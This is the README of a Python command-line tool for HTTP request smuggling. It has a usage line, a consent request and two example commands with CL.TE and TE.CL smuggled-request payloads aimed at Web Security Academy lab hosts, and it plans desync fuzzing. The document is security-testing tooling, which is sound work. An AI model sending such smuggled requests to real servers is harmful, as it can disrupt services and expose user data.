# pyhttpsmuggler
```python
usage: ./pysmuggle [-h | --help] [--host [HOST]] [--port [PORT]] [--ngrok [NGROK]] [--method [METHOD]] 
[--endpoint [ENDPOINT]] [--http-version [HTTP_VERSION]] [--request-headers [REQUEST_HEADERS]] [--debug [DEBUG]]
[--special-formatting [SPECIAL_FORMATTING]] [--body-data [BODY_DATA]] [--body-length [BODY_LENGTH]] 
[--smuggled-body-fields [SMUGGLED_BODY_FIELDS]] [--use-ssl [USE_SSL]]
[--custom-body-payload [CUSTOM_BODY_PAYLOAD]] [--prefix [PREFIX]]
```

Scripts related to web/request smuggling & general web hacking.
This project is free to use and modify. The three things I ask of those interested in using/modifying/distributing this project is:
1. Users have the explicit consent from target host servers' maintainers to test for vulnerabilities-- as a successful exploit may disrupt web-services and/or leak sensitive user-data.
2. Any derivative project using any component from this project upholds the open-source philosophy with others in the research & development community.
3. Lastly, I ask (well, it's more of a statement really) that I assume no liability or responsibility for any & all potential consequences of others'actions when using this script on a live server instance.
## General Information
- The keys for the argument list are colored yellow. The values are purple.
- The request body field is colored such that the purple portion denotes the substring of the request covered by the content-length field. The cyan portion denotes the part of the request to be smuggled. 
## Examples
*Note: passing arguments denoted by pairs of quotations (",') is necessary for request fields which may contain spaces or special charachters*
### CL.TE Vulnerability

```python
./pysmuggle --host "your-access-token.web-security-academy.net" --method "POST" --body-length "35" --body-data ""  --smuggled-body-fields "GET /404 HTTP/1.1,X-Ignore: X" --debug "1"
```
### TE.CL Vulnerability
```python
./pysmuggle --host "your-access-token.web-security-academy.net" --method "POST" --body-length "4" --body-data "5c" --smuggled-body-fields "GPOST / HTTP/1.1,Content-Type: application/x-www-form-urlencoded,Content-Length: 15,,x=1,0," --debug "1"
```
## Changelog
### 9/4/2021
- Implemented a WebRequest class to generate arbitrary web requests with malformed fields and/or fuzz around for TE.CL and CL.TE vulnerabilities in web server configurations.
### 9/5/2021
- Implemented a CLI using argparse and the WebRequest class. This introduces robustness and more opportunities for automation since worker threads can easily invoke specially-crafted requests by passing arguments over the CLI under the control of a parent thread or list of exploits to try.
- Updated README with example usage and development logs
# Todo:
## pyhttpsuggler-cli
1. [X] Improve  CLI for sending arbitrary requests from the command line rather than using driver scripts like smuggle.py. Maybe I will implement this in C++ or scapy depending on the advantages each choice offers...
2. [ ] Add fuzzing engine script to automate fuzzing websites for various HTTP request desync attacks
3. [ ] Create a text file with various desync attacks to test on an target webserver and a parser to turn the entries in the file into different requests.
4. [ ] Cleanup the chunk of if/elif/else login in pysmuggler.py:34-94
